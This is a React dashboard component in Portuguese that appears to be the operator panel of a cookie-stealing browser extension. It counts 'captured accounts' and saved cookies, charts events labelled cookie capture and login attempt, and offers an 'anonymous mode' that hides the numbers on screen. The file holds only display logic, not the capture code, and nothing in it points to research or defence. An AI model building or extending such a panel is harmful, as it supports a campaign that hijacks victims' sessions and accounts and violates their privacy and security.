import { useAuth } from "@/_core/hooks/useAuth";
import DashboardLayout from "@/components/DashboardLayout";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { trpc } from "@/lib/trpc";
import { Activity, Cookie, Eye, MousePointerClick } from "lucide-react";
import { Line, LineChart, ResponsiveContainer, Tooltip, XAxis, YAxis, CartesianGrid } from "recharts";
import { useState } from "react";

export default function Dashboard() {
  const { user } = useAuth();
  const [anonymousMode, setAnonymousMode] = useState(false);
  
  const { data: stats, isLoading } = trpc.stats.overview.useQuery(undefined, {
    refetchInterval: 5000, // Refresh every 5 seconds for real-time updates
  });

  if (isLoading) {
    return (
      <DashboardLayout>
        <div className="flex items-center justify-center min-h-[400px]">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div>
        </div>
      </DashboardLayout>
    );
  }

  const totalClicks = stats?.hitsByType.find(h => h.eventType === "click")?.count ?? 0;
  const totalExtensionOpens = stats?.hitsByType.find(h => h.eventType === "extension_open")?.count ?? 0;

  // Format chart data
  const chartData = stats?.hitsByDate.map(item => ({
    date: new Date(item.date).toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' }),
    hits: Number(item.count),
  })) ?? [];

  return (
    <DashboardLayout>
      <div className="space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold tracking-tight bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent">
              Dashboard
            </h1>
            <p className="text-muted-foreground mt-1">
              Bem-vindo de volta, {user?.name || 'Administrador'}
            </p>
          </div>
          <Button
            variant={anonymousMode ? "default" : "outline"}
            onClick={() => setAnonymousMode(!anonymousMode)}
            className="gap-2"
          >
            <Eye className="h-4 w-4" />
            {anonymousMode ? "Modo Anônimo Ativo" : "Ativar Modo Anônimo"}
          </Button>
        </div>

        {/* Stats Cards */}
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
          <Card className="border-purple-500/20 bg-card/50 backdrop-blur">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Total de Hits</CardTitle>
              <Activity className="h-4 w-4 text-purple-400" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-foreground">
                {anonymousMode ? "***" : stats?.totalHits.toLocaleString() ?? 0}
              </div>
              <p className="text-xs text-muted-foreground mt-1">
                Todos os eventos registrados
              </p>
            </CardContent>
          </Card>

          <Card className="border-blue-500/20 bg-card/50 backdrop-blur">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Cliques</CardTitle>
              <MousePointerClick className="h-4 w-4 text-blue-400" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-foreground">
                {anonymousMode ? "***" : totalClicks.toLocaleString()}
              </div>
              <p className="text-xs text-muted-foreground mt-1">
                Interações do usuário
              </p>
            </CardContent>
          </Card>

          <Card className="border-cyan-500/20 bg-card/50 backdrop-blur">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Contas Capturadas</CardTitle>
              <Cookie className="h-4 w-4 text-cyan-400" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-foreground">
                {anonymousMode ? "***" : stats?.totalAccounts.toLocaleString() ?? 0}
              </div>
              <p className="text-xs text-muted-foreground mt-1">
                Cookies salvos
              </p>
            </CardContent>
          </Card>

          <Card className="border-violet-500/20 bg-card/50 backdrop-blur">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Aberturas</CardTitle>
              <Eye className="h-4 w-4 text-violet-400" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-foreground">
                {anonymousMode ? "***" : totalExtensionOpens.toLocaleString()}
              </div>
              <p className="text-xs text-muted-foreground mt-1">
                Extensão aberta
              </p>
            </CardContent>
          </Card>
        </div>

        {/* Chart */}
        <Card className="border-purple-500/20 bg-card/50 backdrop-blur">
          <CardHeader>
            <CardTitle>Hits nos Últimos 7 Dias</CardTitle>
            <CardDescription>
              Visualização temporal dos eventos registrados
            </CardDescription>
          </CardHeader>
          <CardContent>
            {chartData.length > 0 ? (
              <ResponsiveContainer width="100%" height={350}>
                <LineChart data={chartData}>
                  <CartesianGrid strokeDasharray="3 3" stroke="hsl(var(--border))" />
                  <XAxis 
                    dataKey="date" 
                    stroke="hsl(var(--muted-foreground))"
                    fontSize={12}
                  />
                  <YAxis 
                    stroke="hsl(var(--muted-foreground))"
                    fontSize={12}
                  />
                  <Tooltip 
                    contentStyle={{
                      backgroundColor: "hsl(var(--popover))",
                      border: "1px solid hsl(var(--border))",
                      borderRadius: "8px",
                    }}
                    labelStyle={{ color: "hsl(var(--popover-foreground))" }}
                  />
                  <Line 
                    type="monotone" 
                    dataKey="hits" 
                    stroke="hsl(var(--primary))" 
                    strokeWidth={2}
                    dot={{ fill: "hsl(var(--primary))", r: 4 }}
                    activeDot={{ r: 6 }}
                  />
                </LineChart>
              </ResponsiveContainer>
            ) : (
              <div className="flex items-center justify-center h-[350px] text-muted-foreground">
                Nenhum dado disponível
              </div>
            )}
          </CardContent>
        </Card>

        {/* Event Type Distribution */}
        <Card className="border-blue-500/20 bg-card/50 backdrop-blur">
          <CardHeader>
            <CardTitle>Distribuição por Tipo de Evento</CardTitle>
            <CardDescription>
              Quantidade de eventos por categoria
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {stats?.hitsByType.map((item) => {
                const percentage = stats.totalHits > 0 
                  ? ((Number(item.count) / stats.totalHits) * 100).toFixed(1)
                  : 0;
                
                const eventLabels: Record<string, string> = {
                  cookie_capture: "Captura de Cookie",
                  login_attempt: "Tentativa de Login",
                  extension_open: "Abertura da Extensão",
                  click: "Clique",
                };

                return (
                  <div key={item.eventType} className="space-y-2">
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-foreground font-medium">
                        {eventLabels[item.eventType] || item.eventType}
                      </span>
                      <span className="text-muted-foreground">
                        {anonymousMode ? "***" : `${item.count} (${percentage}%)`}
                      </span>
                    </div>
                    <div className="h-2 bg-muted rounded-full overflow-hidden">
                      <div 
                        className="h-full bg-gradient-to-r from-purple-500 to-blue-500 rounded-full transition-all"
                        style={{ width: anonymousMode ? "0%" : `${percentage}%` }}
                      />
                    </div>
                  </div>
                );
              })}
            </div>
          </CardContent>
        </Card>
      </div>
    </DashboardLayout>
  );
}
